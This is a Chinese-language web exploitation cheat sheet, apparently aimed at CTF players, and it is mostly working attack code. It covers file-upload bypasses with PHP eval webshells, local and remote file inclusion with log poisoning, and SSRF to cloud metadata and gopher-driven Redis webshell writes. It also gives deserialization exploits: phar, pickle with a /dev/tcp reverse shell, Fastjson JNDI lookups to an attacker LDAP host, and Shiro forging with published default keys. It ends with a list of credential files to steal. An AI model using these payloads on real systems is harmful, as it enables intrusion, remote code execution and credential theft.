# server|服务端漏洞|🖥️

## [g-upload] 文件上传——黑名单、内容检测到配置型 Getshell 的完整绕过链
### [upload-blacklist] 黑名单绕过：畸形后缀与解析漏洞配合 | easy | 文件上传;黑名单;解析漏洞 | -
> 服务端仅按后缀黑名单拦截时，用畸形扩展名或解析器特性把 PHP 代码落地执行。

#### 原理
过滤器只挡 `php` 字样时，Apache/Nginx 按扩展名映射仍可能执行其他 PHP 后缀。

#### 畸形后缀表
| 后缀 | 说明 |
| --- | --- |
| .php5 .phtml .pht .php3 .php4 .php7 | Apache 常见可执行 PHP 后缀 |
| .PhP .pHp .PHP | 大小写绕过（过滤常不区分大小写） |
| .php. .php .php%20 | 尾随点/空格/换行，过滤后仍映射 php |
| .pphphp .php.jpg.php | 双写绕过后缀替换 |
| .php%00.jpg | 空字节截断（老版本，见 warn） |

#### 基础利用
```http
POST /upload.php HTTP/1.1
Content-Type: multipart/form-data

-----------------------------boundary
Content-Disposition: form-data; name="file"; filename="shell.php5"
Content-Type: application/x-php

<?php @eval($_POST['x']);?>
-----------------------------boundary--
```

#### 解析漏洞配合
- Apache 多后缀：`shell.php.jpg` 从右往左匹配已知扩展名，老版本（httpd 2.2 + mod_php）把整文件当 PHP 解析
- Nginx 空字节：`shell.jpg%00.php` 通知 PHP-FPM 时被截断解析为 php（已修复，极少见）
- Nginx CGI 配置错误：凡固定 `fastcgi_param SCRIPT_FILENAME` 到上传目录时 `xxx.png` 也可能被解析
- IIS 6.0 分号截断：`shell.asp;.jpg`（考古向）

> [!tip] 上传后访问路径必须与脚本执行路径一致：`.php5` 在纯 Nginx + fastcgi 且只把 `.php` 交给 PHP-FPM 的站点上不执行。先传 `1.php.jpg` 内容 `<?php echo 1;?>` 访问验证解析器再走链。

> [!warn] 空字节截断 `%00` 在 PHP 5.3.4+ 与主流 Nginx 上已修复，别浪费请求；通配符挡不住就试大小写与双写。

### [upload-content] 内容检测绕过：图片马与合并 | medium | 文件上传;图片马;条件竞争 | -
> 白名单校验后缀与 MIME 时，把 PHP 代码藏进合法图片，再靠包含或解析漏洞触发。

#### 合成图片马
```bash
# 直接在合法图片尾部追加代码
echo '<?php @eval($_POST["x"]);?>' >> evil.jpg
# 或 copy 合并（更稳，二进制不破坏）
copy normal.jpg /b + shell.txt /b shell.jpg
```

#### 伪造三板斧
1. 后缀白名单 → 图片后缀 + 解析漏洞 / LFI 配合
2. MIME 白名单 → 改 `Content-Type: image/jpeg`
3. 文件头校验 → 内容以图片头开头
```txt
GIF89a
<?php @eval($_POST['x']);?>
```

#### 二次渲染对抗
GD/Imagick 会重绘图片，直接附加的代码被抹掉：
- 用 `exiftool -Comment='<?php ...;?>' shell.jpg` 写入 EXIF 元数据，找不重写元数据的渲染点
- 或利用 GD 不重写的区域（如某些尺寸下的尾部字节）
- 再不行就纯色图片最小化改动，逐字节二分定位保留区

#### 条件竞争
系统先落盘后校验再删除时，并发抢在删除前访问一次即可（文件名固定/可预测才可行）：
```bash
# 终端 A：疯狂上传
while true; do curl -s -F 'file=@t.php' 'http://t/upload.php' -o /dev/null; done
# 终端 B：疯狂访问
while true; do curl -s 'http://t/uploads/t.php?c=id'; done
```

> [!tip] 触发不了解析就找 LFI：`?page=uploads/shell.jpg` 直接包含时，图片里的 `<?php` 会被当 PHP 执行。

> [!warn] 图片马里的代码若在二进制垃圾中间会语法报错，尽量把代码放在文件头之后、垃圾之前。

### [upload-config] 配置型 Getshell：.htaccess 与 .user.ini | medium | 文件上传;.htaccess;.user.ini | -
> 上传目录允许写入配置文件时，靠 Apache/Nginx 指令把任意后缀文件变成可执行 PHP。

#### .htaccess（Apache）
```apache
# 方案一：把 jpg 都映射为 PHP
AddType application/x-httpd-php .jpg
# 方案二：只针对某文件设置处理器
<FilesMatch "shell">
  SetHandler application/x-httpd-php
</FilesMatch>
```
再上传内容为 `<?php @eval($_POST['x']);?>` 的 `shell.jpg`。

> [!warn] `.htaccess` 需 `AllowOverride All` 才生效；Nginx 不解析 .htaccess。

#### .user.ini（Nginx + PHP-FPM）
PHP 支持按目录的 `.user.ini`（CGI/FPM 模式、PHP 5.3+）：
```ini
auto_prepend_file=shell.jpg
```
再上传含 PHP 代码的 `shell.jpg`：目录下任意 `.php` 被访问时都会先自动包含它。
```bash
# 访问任意存在的 php 文件即可触发预包含
curl 'http://t/upload/index.php?c=id'
# shell.jpg 内容：<?php system($_GET["c"]);?>
```

> [!tip] 先探测配置机会：能传 `.htaccess`/`.user.ini`（常见重命名过滤漏掉点开头文件）再谈 getshell；传不进去就回到后缀绕过。

> [!warn] 若系统把上传文件随机改名并放独立目录，上述配置类姿势失效，优先找解析漏洞或图片马+LFI。

## [g-lfi] 文件包含——filter 读源码、伪协议执行到日志投毒
### [lfi-filter] php://filter 读源码 | easy | 文件包含;php://filter;源码泄露 | -
> 可控参数被 include 时，用 php://filter 流以 base64 编码读回源码，绕开"文件被当 PHP 执行"。

#### 用法
```php
// 目标：include($_GET['page']);
?page=php://filter/read=convert.base64-encode/resource=index.php
```
```bash
curl -s 'http://t/?page=php://filter/read=convert.base64-encode/resource=config.php' | base64 -d
```

> [!tip] 相对路径按服务端工作目录推断，配合 `../` 定位：`php://filter/convert.base64-encode/resource=../../../../etc/passwd`。

#### filter 变体
| 链 | 用途 |
| --- | --- |
| `string.rot13` | 绕过对明文关键字的简单过滤 |
| `convert.base64-decode` 链式 | 绕过内容扫描（多层编码混淆） |
| `zlib.deflate`/`zlib.inflate` | 压缩流混淆、读大文件 |

> [!warn] base64 输出里若是空或报错，试试换 `resource=../` 层级、加绝对路径，或先 `php://filter/resource=...` 裸读判断文件是否存在。

### [lfi-input] php://input 与 data:// 直接执行 | medium | 文件包含;php://input;data:// | -
> 允许远程流时，php://input 把 POST 体当 PHP 执行，data:// 把代码内联进 URL。

#### php://input
```bash
# 要求 allow_url_include=On
curl -s -d '<?php system($_GET["c"]);?>' 'http://t/?page=php://input&c=id'
```

#### data://
```bash
# 简单探测
curl -s 'http://t/?page=data://text/plain,<?php echo 1;?>'
# base64 编码版（内容含特殊字符时更稳）
curl -s 'http://t/?page=data://text/plain;base64,PD9waHAgZWNobyAxOz8+'
```
`PD9waHAgZWNobyAxOz8+` 解码为 `<?php echo 1;?>`。

> [!tip] filter 读不到源码而执行又不行时，逐个试：`php://filter`（读）→ `data://`（执行）→ `php://input`（执行，POST 体不受 URL 长度限制）。

> [!warn] `data://` 与 `php://input` 都要求 `allow_url_include=On`（默认 Off）；先看有无 phpinfo 或报错佐证再依赖执行型姿势。

### [lfi-rfi] 日志包含、Session 包含与远程包含 | hard | 文件包含;日志投毒;远程包含 | -
> 没有可直接包含的代码文件时，把 payload 写进日志/session/临时文件再包含，或远程包含恶意文件。

#### 日志包含（最常用）
```bash
# 1) 把 PHP 写进 User-Agent（Apache/Nginx access.log）
curl -s -A '<?php system($_GET["c"]);?>' 'http://t/?page=1'
# 2) 包含日志触发
curl -s 'http://t/?page=../../../../var/log/apache2/access.log&c=id'
```
常用日志路径：
- `/var/log/apache2/access.log`（Debian/Ubuntu）、`/usr/local/apache/logs/access_log`
- `/var/log/nginx/access.log`、`/var/log/nginx/error.log`

> [!tip] UA 里的 PHP 可能被日志 URL 编码（`%3C?php`），多试原样/编码两种投毒；也可投到 Referer、Cookie。

#### Session 与 /proc 包含
```php
// session 文件：/var/lib/php/sessions/sess_<PHPSESSID>
// 先把 payload 写进 session 值（如用户名），再包含
?page=../../../../var/lib/php/sessions/sess_abc123
// CGI 模式下环境变量会被写入 /proc/self/environ，UA 携带 payload 后包含
?page=../../../../proc/self/environ
```

#### 远程包含（RFI）
- 条件：`allow_url_include=On`（现代 PHP 默认 Off）
```bash
# 直接远程包含；末尾加 ? 或 %23 截断服务端拼接
?page=http://attacker.com/shell.txt?
?page=http://attacker.com/shell.txt%23&c=id
```

> [!warn] RFI 现代环境基本不可用；LFI 优先级：filter 读源码 → 日志/session 投毒包含 → 跑 phpggc 链。日志包含不要求 include 里路径可控深度，只要最终能拼到日志绝对路径。

## [g-ssrf] SSRF——探测回连、协议利用到 gopher 打内网
### [ssrf-detect] SSRF 探测与回连验证 | easy | SSRF;探测;回连 | -
> 参数可控的 URL 触发服务端请求，用带外平台确认并判断出网与回连主体。

#### 触发点
- 参数名：`url=` `src=` `path=` `image=` `download=` `target=` `callback=` `redirect=`
- 功能：图片/文档预览、PDF 生成、爬虫抓取、Webhook、二维码生成、SSO 回调

#### 回连验证
```bash
# 直接回连你的服务器
?url=http://<your-ip>:8080/ssrf-probe
# 或带外 DNS 平台（dnslog/interactsh）
?url=http://xxx.dnslog.cn
```

> [!tip] 回连 IP 必须是目标服务器公网 IP 而不是你自己的——排除"参数最终由浏览器打开"的伪 SSRF（CSRF 型）。

#### 探测顺序
1. http/https 是否可达（回连）
2. 是否禁 localhost/内网（用绕过表再测）
3. 是否支持 file/dict/gopher（协议白名单）

### [ssrf-protocol] 协议利用与云元数据 | medium | SSRF;云元数据;内网扫描 | -
> 服务端组件决定可用协议，file 读文件、dict/gopher 打 TCP，云环境直奔 169.254.169.254。

#### 读本地文件
```bash
?url=file:///etc/passwd
?url=file:///proc/self/environ
```

#### 内网端口扫描与探测
```bash
# 用响应差异（长度/时间/报错内容）判断端口开放
?url=http://127.0.0.1:6379/
?url=http://127.0.0.1:8080/
# dict 协议可向任意 TCP 发命令（Redis 协议探测）
?url=dict://127.0.0.1:6379/info
```

#### 云元数据地址表
| 云厂商 | 地址 | 常用路径 |
| --- | --- | --- |
| AWS | http://169.254.169.254 | /latest/meta-data/iam/security-credentials/ |
| 阿里云 | http://100.100.100.200 | /latest/meta-data/ram/security-credentials/ |
| GCP | http://metadata.google.internal | /computeMetadata/v1/instance/service-accounts/default/token |
| 腾讯云 | http://metadata.tencentyun.com | /latest/meta-data/cvm/security-credentials/ |

```bash
# AWS 拿角色名 → 拿临时凭证
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
```
GCP 需 `Metadata-Flavor: Google` 头，部分实现可注入请求头时可用。

#### 绕过防护表
| 技巧 | 示例 |
| --- | --- |
| @ 用户信息 | `http://example.com@169.254.169.254/` |
| IP 进制 | `http://0x7f000001/`、`http://2130706433/`、`http://127.1/` |
| 30x 重定向 | 校验后服务端跟随跳转 302 → 169.254.169.254 |
| DNS 重绑定 | 首次解析外网 IP 过白名单，二次解析 127.0.0.1 |
| 双编码 | `%2569` 等 URL 双编码绕过关键字 |

> [!warn] 元数据地址只在云环境本机可达；先确认目标确实在云（hostname、`/etc/motd`、探测 80/8080 指纹），别在裸机空耗。

### [ssrf-redis] gopher 打 Redis 写 Webshell | hard | SSRF;gopher;Redis | -
> gopher 协议能向任意 TCP 端口发送原始字节，经典场景：内网未授权 Redis 写 Web 目录拿 Webshell。

#### 原理
`gopher://host:port/_<原始数据>`：`_` 是不被发送的占位符，`%0d%0a` 即 CRLF，整段按 Redis RESP 协议编码后由服务端 socket 发出。

#### 生成模板（长度自动计算，不会算错）
```python
# gen_gopher_redis.py
import urllib.parse

def cmd(name, *args):
    s = f"*{len(args)+1}\\r\\n${len(name)}\\r\\n{name}\\r\\n"
    for a in args:
        b = a.encode()
        s += f"${len(b)}\\r\\n{a}\\r\\n"
    return s

shell = "<?php eval($_POST['x']);?>"
lines = (
    cmd("set", "1", shell) +
    cmd("config", "set", "dir", "/var/www/html") +
    cmd("config", "set", "dbfilename", "shell.php") +
    cmd("save")
)
url = "gopher://127.0.0.1:6379/_" + urllib.parse.quote(lines, safe="")
print(url)
```

#### 利用
```bash
# 1) 把生成的 gopher URL 放进 SSRF 参数触发
curl -s 'http://t/ssrf?url=...生成的gopher串...'
# 2) Redis 写盘后访问 Webshell
curl -s 'http://t/shell.php' -d 'x=system("id");'
```

#### 同思路变体
- 写 crontab：`dir /var/spool/cron`、`dbfilename root`（值改反弹 shell 命令）
- 写 SSH 公钥：`dir /root/.ssh`、`dbfilename authorized_keys`
- 无 Web 目录权限时优先 crontab/公钥

> [!tip] dict:// 只能逐条发命令（每条一个 URL）；gopher 一次性发送整段命令序列，是首选。

> [!warn] 前提：Redis 未授权或弱密码、内网可达、目标目录可写；`flushall` 破坏性强，确认这是你自己打的靶再带。

## [g-deser-php] PHP 反序列化——格式、魔术方法与 POP 链
### [deser-php-serialize] serialize 格式与魔术方法 | easy | 反序列化;PHP;魔术方法 | -
> PHP 对象被序列化为可读字符串，反序列化入口可控时借魔术方法触发危险行为。

#### 格式解析
```php
O:7:"Article":3:{s:8:"username";s:5:"admin";s:8:"is_admin";b:1;s:5:"score";i:100;}
```
| 类型 | 格式 |
| --- | --- |
| null | N; |
| bool | b:1; b:0; |
| int | i:100; |
| string | s:5:"hello"; |
| array | a:2:{k;v;k;v} |
| object | O:7:"Class":2:{prop;value;...} |
| 私有属性 | s:11:"\0Class\0name";（类名前带 null 字节） |

#### 魔术方法表
| 方法 | 触发时机 | 利用方向 |
| --- | --- | --- |
| __wakeup() | 反序列化时 | 属性重置、绕过链起点 |
| __destruct() | 对象销毁 | 最常用的 RCE 出口 |
| __toString() | 当字符串用 | 文件操作/正则/拼接场景 |
| __call() | 调不存在方法 | 转发到危险函数 |
| __get() / __set() | 读写不可访问属性 | 链式取值传递 |
| __invoke() | 当函数调用 | 常见链尾 |

> [!tip] 找入口：`unserialize()` 调用、`session` 数据、Cookie 里的 base64 序列化串（`Tzo...` 开头）。找出口：`eval` `system` `assert` `call_user_func` `include` `file_put_contents`。

> [!warn] `__wakeup` 绕过（CVE-2016-7124）：把 `O:7:"Class":2:` 的属性数改大（如 3），老版本 PHP 跳过 __wakeup 直接继续；PHP 7.4+ 已修复。

### [deser-php-pop] POP 链构造思路 | hard | 反序列化;POP链;代码审计 | -
> 无现成链时，在应用自身类里找"可控属性 → 魔术方法 → 危险函数"的调用链。

#### 四步走
1. 找 sink：`eval` `system` `exec` `call_user_func` `include` `file_put_contents`
2. 找 gadget：能调用 sink 的方法，且参数来自类属性
3. 拼链：从 `__wakeup` / `__destruct` / `__toString` 起步，把属性值逐一可控化
4. 生成：用脚本输出序列化串，别手写（属性数、类型、可见性极易错）

#### 最小利用模板
```php
<?php
// payload_gen.php：本地搭同版本环境生成
class A {
    public $cmd = "id";
    public function __destruct() { system($this->cmd); }
}
echo serialize(new A());
// 输出串贴进入口参数
// O:1:"A":1:{s:3:"cmd";s:2:"id";}
?>
```

> [!tip] 链子越长越容易断在环境差异上：先写最小链验证入口（如让 __destruct 弹 DNSLog），再上完整链条。属性是 protected/private 时序列化串含 \0 字节，URL 传递需 urlencode。

### [deser-php-phar] phar 反序列化与 phpggc | medium | 反序列化;phar;phpggc | -
> phar 文件元数据存序列化数据，任何触发 phar:// 的文件操作都会反序列化元数据（PHP 8 前）。

#### 生成恶意 phar
```php
<?php
// phar_gen.php
class Evil {
    public $cmd = "id";
    public function __destruct() { system($this->cmd); }
}
$p = new Phar("p.phar");
$p->startBuffering();
$p->setStub("<?php __HALT_COMPILER(); ?>");
$p->addFromString("a", "a");
$p->setMetadata(new Evil());
$p->stopBuffering();
rename("p.phar", "p.jpg"); // 伪装成图片，phar 可前置 GIF89a 头
?>
```
```bash
php -d phar.readonly=0 phar_gen.php
```

#### 触发点（不限于 include）
```php
include("phar://upload/p.jpg");
file_exists("phar://upload/p.jpg");   // 文件操作函数均可触发
getimagesize("phar://upload/p.jpg");  // 读图片的接口也危险
```

#### phpggc 快速利用
```bash
# 列出可用链
php phpggc -l
# 生成 phar 格式 payload
php phpggc -p phar -o shell.phar Laravel/RCE1 system 'id'
# 普通序列化串
php phpggc Laravel/RCE1 system 'id'
```

> [!tip] phar 利用面广：文件上传点+文件操作函数即可打，不需要 include 参数。先看目标 PHP 版本（8.x 对 metadata 反序列化有限制）再决定链子。

> [!warn] 生成需 `phar.readonly=0`；stub 后的 `__HALT_COMPILER();` 缺一不可，否则文件不合法。改后缀不影响 phar 结构。

## [g-deser-java] Java 反序列化——ysoserial、Fastjson 与 Shiro
### [deser-java-ysoserial] ysoserial 生成与链速查 | medium | 反序列化;Java;ysoserial | -
> ObjectInputStream.readObject 入口可控时，用 ysoserial 生成 gadget 链 payload 打命令执行。

#### 生成命令
```bash
# URLDNS 只探测不 RCE：目标反序列化时发 DNS 请求
java -jar ysoserial.jar URLDNS "http://xxx.dnslog.cn" > probe.bin

# 命令执行链
java -jar ysoserial.jar CommonsCollections5 "id" > cc5.bin
java -jar ysoserial.jar CommonsCollections6 "id" > cc6.bin
java -jar ysoserial.jar CommonsBeanutils1 "id" > cb1.bin
```

#### 链与依赖速查
| 链 | 依赖 | 备注 |
| --- | --- | --- |
| URLDNS | JDK 自带 | 只探测，首选确认入口 |
| CommonsCollections1-3 | commons-collections 3.x | 3.2.2 加反序列化白名单后失效 |
| CommonsCollections5/6 | commons-collections 3.1-3.2.1 | 5 适合 JDK8 老版本；6 通用 |
| CommonsCollections4 | commons-collections 4.x | 打 4.0-4.1 |
| CommonsBeanutils1 | commons-beanutils | 依赖常见，广泛备选 |

#### 投递方式
- 参数 base64：`?data=$(base64 -w0 cc6.bin)`
- JSON/Header 直接放二进制（部分框架自动 base64 解码）
- 十六进制/URL 编码按目标解码习惯调整

> [!warn] gadget 依赖不匹配直接报错或无回显；URLDNS 通只证明入口存在。无回显用 `ping <id>.dnslog.cn` 一类命令做带外确认。

### [deser-java-fastjson] Fastjson autoType 利用 | medium | Fastjson;autoType;反序列化 | -
> Fastjson 反序列化 JSON 时 `@type` 可控（1.2.24 全开、1.2.47 有 cache 绕过），可触发 JNDI 注入。

#### 1.2.24 直接利用
```json
{
  "a": {
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://attacker:1389/Evil",
    "autoCommit": true
  }
}
```
JdbcRowSetImpl 属性赋值即触发 JNDI 查询 → LDAP 返回恶意类工厂 → 类初始化执行命令。

#### 1.2.47 绕过（先缓存 Class）
```json
{
  "a": { "@type": "java.lang.Class", "val": "com.sun.rowset.JdbcRowSetImpl" },
  "b": {
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://attacker:1389/Evil",
    "autoCommit": true
  }
}
```
先用 `java.lang.Class` 把目标类塞进缓存，再正常触发，绕过 autoType 黑名单检查（≤1.2.47）。

#### JNDI 服务端
```bash
# marshalsec 起 LDAP
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker/Evil.class" 1389
# Evil.class 由 ysoserial JNDIExploit / 手工编译（static{} 或构造函数里执行命令）
```

> [!warn] 高版本 Fastjson 默认 `autoTypeSupport=false` 并加 checkAutoType 黑名单，直接 @type 会报错；利用还受目标 JDK 版本影响（LDAP 远程类加载老版本才放开）。先探测版本（报错回显/差异）再选链。

### [deser-java-shiro] Shiro rememberMe 硬编码密钥 | easy | Shiro;rememberMe;硬编码密钥 | -
> Shiro 用 AES 加密 rememberMe Cookie，密钥为公开硬编码值时，伪造序列化 payload 直达反序列化 RCE。

#### 一键利用
```bash
# 爆破密钥成功后用 ysoserial 链加密 Cookie
python3 shiro_exploit.py -u http://t -k kPH+bIxk5D2deZiIxcaaaA== -p CommonsCollections6 "id"
```

#### 常用默认密钥
```txt
kPH+bIxk5D2deZiIxcaaaA==
2AvVhdsgUs0FSA3SDFQag==
4AvVhmFLUs0KTA3Kprsdag==
```

#### 手工链
1. 生成序列化 payload：`java -jar ysoserial.jar CommonsCollections6 "id" > p.bin`（先 URLDNS 探测）
2. Cookie 结构：`rememberMe=<base64(AES-CBC(key, iv, payload))>`，iv 随机 16 字节，AES/CBC/PKCS5Padding
3. 附 `Cookie: rememberMe=<payload>` 发请求

> [!tip] 响应 `Set-Cookie: rememberMe=deleteMe` = 解密失败/密钥错误，换 key 继续；不出现则可能已成功（或未走解密）。新版修复了默认 key 与 CBC 配置，多测几个公开 key 表。

> [!warn] Shiro 1.4.2+ 默认改 AES-GCM 并随机密钥，能打的是旧版本或开发者复用公开 key 的配置；先确认版本与 Cookie 形态（CBC 的 rememberMe 是 base64 明文可解出 iv+密文）。

## [g-deser-py] Python/Node 反序列化——pickle、yaml 与 node-serialize
### [deser-py-pickle] pickle __reduce__ RCE | medium | 反序列化;Python;pickle | -
> pickle.loads 不可信数据即可任意代码执行，__reduce__ 让对象按可控参数重建。

#### 模板
```python
# gen_pickle_payload.py
import pickle, base64, os

class RCE:
    def __reduce__(self):
        return (os.system, ("id",))

payload = base64.b64encode(pickle.dumps(RCE())).decode()
print(payload)
```
```bash
# 目标端等价：数据解 base64 后 pickle.loads
python3 -c "import pickle; pickle.loads(__import__('base64').b64decode('PAYLOAD'))"
```

#### 变体
- 反弹 shell：`(os.system, ("bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'",))`
- 无需 os：`(eval, ("__import__('os').system('id')",))`
- 无回显打带外：`(os.system, ("ping <id>.dnslog.cn",))`

#### 入口
- Cookie/session 用 pickle 的自研框架
- 上传的 `.pkl` `.joblib` `.npy` 模型文件被加载
- 某些缓存/消息队列的序列化字节

> [!warn] `pickle.loads` 永远只加载可信数据；能改参数的地方直接 `__reduce__` 上 RCE，不能就找加载上传 pkl 的功能点。

### [deser-py-yaml-node] yaml.load 与 node-serialize | medium | yaml;node-serialize;反序列化 | -
> Python yaml.load 可实例化任意类，Node 的 node-serialize 把函数字符串直接 eval。

#### yaml.load（Python）
```yaml
!!python/object/apply:os.system ["id"]
!!python/object/apply:subprocess.check_output ["cat /etc/passwd", "shell=True"]
```
```bash
# 触发（UnsafeLoader 才危险）
python3 -c "import yaml; yaml.load(open('p.yml'), Loader=yaml.UnsafeLoader)"
```

> [!warn] PyYAML 5.1+ 的裸 `yaml.load()` 默认 SafetyLoader，需确认项目显式用了 `UnsafeLoader`/`FullLoader` 才可打；先看代码再构造。

#### node-serialize 利用
```javascript
// var serialize = require('node-serialize');
// serialize.unserialize(input) 会 eval `_$$ND_FUNC$$_` 标记的字符串
var payload = '{"rce":"_$$ND_FUNC$$_function(){return require(\"child_process\").exec(\"id\",function(e,s){console.log(s)})}()"}';
```
要点：`_$$ND_FUNC$$_` 开头表示函数体，末尾紧跟 `()` 立即执行。

> [!tip] 顺带测 JSON 深合并/原型污染入口（merge/assign 类函数），配合 `child_process` 可升级为 RCE；Node 原生 `JSON.parse` 不执行代码，只有库会，先确认依赖。

## [g-traversal] 目录遍历——../ 变体、下载参数与目标文件清单
### [traversal-variants] ../ 变体全集 | easy | 目录遍历;编码绕过;路径穿越 | -
> 过滤 ../ 时用编码、双写、绝对路径等变体绕过，目标是文件读取/包含函数。

#### 变体清单
| 变体 | 示例 | 场景 |
| --- | --- | --- |
| 基础 ../ | `../../../../etc/passwd` | 无过滤 |
| URL 编码 | `%2e%2e%2f`、`..%2f` | 服务端解码一次 |
| 双编码 | `%252e%252e%252f` | 解码两次 |
| 双写 | `....//`、`..%2f..%2f` | 过滤一次替换为空 |
| 绝对路径 | `/etc/passwd` | 拼接型直接覆盖 |
| 截断替换 | `....//....//etc/passwd` | 过滤 `../` 为空后的递归绕过 |
| Windows | `..\\..\\`、`..;/`（IIS） | 目标为 Windows |
| null 截断 | `../../etc/passwd%00.png` | 拼接扩展名（老平台） |

> [!tip] 先确定过滤是"替换"还是"删除"、是否递归，再选变体。参数值整体 URL 编码一次再发，`../../` 的 `..` 用 `%2e%2e/` 常能过正则。

#### 验证命令
```bash
curl --path-as-is 'http://t/download?file=../../../../etc/passwd'
curl --path-as-is 'http://t/download?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd'
```
`--path-as-is` 防止 curl 自己把 `..` 规范化掉。

> [!warn] `%00` 截断在现代 Web 栈基本无效，只在老版本 Tomcat/IIS/PHP<5.3.4 碰运气。

### [traversal-download] 下载型 filename 参数挖掘 | easy | 任意文件读取;参数挖掘;下载 | -
> 下载/导出接口的 filename/path 参数是任意文件读取高发点，先找参数形态再枚举目标。

#### 高发入口
- `/download?filename=`、`/file?path=`、`/export?name=`
- 附件接口：`/attachments?f=`、`/upload/download?id=`
- 后台：备份下载、日志查看、报表导出

#### 参数形态
| 形态 | 示例 |
| --- | --- |
| 直接路径 | `?file=../../../../etc/passwd` |
| base64 参数 | `?f=Li4vLi4vLi4vZXRjL3Bhc3N3ZA==`（`../../../etc/passwd` 的 base64） |
| JSON 字段 | `{"path":"../../etc/passwd"}` |
| 拼接扩展名 | 配 `%00` 截断（老平台）或探测是否自动补后缀 |

> [!tip] 成功读到一个文件后按同结构猜其他路径（见下一节清单）；若接口对路径做 realpath 白名单，先测正常相对路径（`?file=1.txt`）再试穿越层级。

### [traversal-targets] 读取目标清单 | easy | 任意文件读取;信息收集;敏感文件 | -
> 任意文件读取到手后按优先级扩散：账户、密钥、配置、运行信息。

#### 优先级清单
| 目标 | 路径 | 用途 |
| --- | --- | --- |
| CTF flag | `/flag`、`/flag.txt`、`/root/flag` | 直接得分 |
| 账户文件 | `/etc/passwd`、`/etc/shadow`（少读） | 用户枚举 |
| 环境变量 | `/proc/self/environ` | 数据库密码、密钥、flag |
| 进程信息 | `/proc/self/cmdline`、`/proc/self/status` | 启动参数、当前用户 |
| Web 配置 | `config.php`、`application.yml`、`web.xml` | 数据库/Redis 凭证 |
| 源码与 git | `.git/config`、备份/压缩包 | 二次审计 |
| SSH 密钥 | `/root/.ssh/id_rsa`、`/home/*/.ssh/` | 横向移动 |
| 云凭证 | `~/.aws/credentials`、`/etc/hostname` | 云资产接管 |
| Windows | `C:\Windows\win.ini`、`C:\inetpub\wwwroot\web.config` | 目标为 Windows |

```bash
# 常用探测组合
?file=../../../../etc/passwd
?file=../../../../proc/self/environ
?file=../../../../proc/self/cmdline
?file=../../../../home/www/.ssh/id_rsa
```

> [!tip] 拿到 Web 目录后优先找配置与备份文件定位数据库口令；`/proc/self/environ` 一次能读全环境变量，信息密度最高。

> [!danger] 读到的数据库密码、云凭证属于敏感数据：报告里只写"存在该文件+位置+脱敏前缀"，不要全文贴出，避免凭证泄露与重复利用问题。